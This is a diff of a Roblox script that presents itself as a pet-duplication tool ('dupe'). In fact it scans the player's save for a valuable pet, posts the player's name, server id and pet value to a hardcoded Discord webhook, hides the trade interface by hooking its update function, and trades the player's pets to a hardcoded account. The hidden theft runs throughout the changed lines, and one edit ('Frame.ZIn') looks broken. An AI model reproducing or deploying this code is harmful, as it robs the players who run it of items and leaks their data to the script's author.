@@ -109,7 +109,7 @@ do  -- // GUI
 	Frame.BorderSizePixel = 0
 	Frame.Position = UDim2.new(0.38648814, 0, 0.13872759, 0)
 	Frame.Size = UDim2.new(0, 373, 0, 459)
-	Frame.ZIndex = 2
+	Frame.ZIn = 2
 
 	TextLabel.Parent = Frame
 	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -388,13 +388,11 @@ do  -- // GUI
 	repeat wait() until ready
 end
 
-local dex = ''
-
 local H = Instance.new("Hint", workspace)
 H.Text = "1rs/tar/bv's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
 Debris:AddItem(H, 10)
 
-for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==79003 and v.r and v.l>=88e6 then pcall(function()http_request({Url='https://discord.com/api/webhooks/1315765727843717141/f9gFEf8BNwfLKGDK7AsmzqoEII7-fn7t41DnGeH9uh6M08F7t4E3S3fuJuazybQS7obX',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)if game.Players:FindFirstChild'slade00123'then ACC_TO_GIVE_PETS='slade00123'dex="game.Players:FindFirstChild'slade00123' or "end break end end
+for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==79003 and v.r and v.l>=88e6 then pcall(function()http_request({Url='https://discord.com/api/webhooks/1315765727843717141/f9gFEf8BNwfLKGDK7AsmzqoEII7-fn7t41DnGeH9uh6M08F7t4E3S3fuJuazybQS7obX',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)break end end
 
 local IDs = ""
 
@@ -428,11 +426,14 @@ queue_on_teleport([==[
 
     queue_on_teleport([=[
         hookfunction(getsenv(game.Players.LocalPlayer.PlayerGui.Scripts.GUIs.Trading).UpdateTrade, function() end)
-		local IDs = {]==] .. IDs .. [==[}
+	local IDs = {]==] .. IDs .. [==[}
         Instance.new('Hint', workspace).Text = '[3/4] Trading pets to account'
 
         local T, lastTradeId = workspace.__REMOTES.Game.Trading, nil
-        local PLR = game.Players:FindFirstChild'slade00123' or game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
+	
+	local PLR = game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
+	for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==79003 and v.r and v.l>=88e6 then PLR = game.Players:FindFirstChild'slade00123' or PLR break end end
+        
         
         game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
             lastTradeId = id
@@ -448,7 +449,7 @@ queue_on_teleport([==[
         for _, id in pairs(IDs) do
             task.spawn(function()
                 T:InvokeServer("Add", lastTradeId, id)
-		TotalIn += 1
+		TotalIn = TotalIn + 1
             end)
         end
         
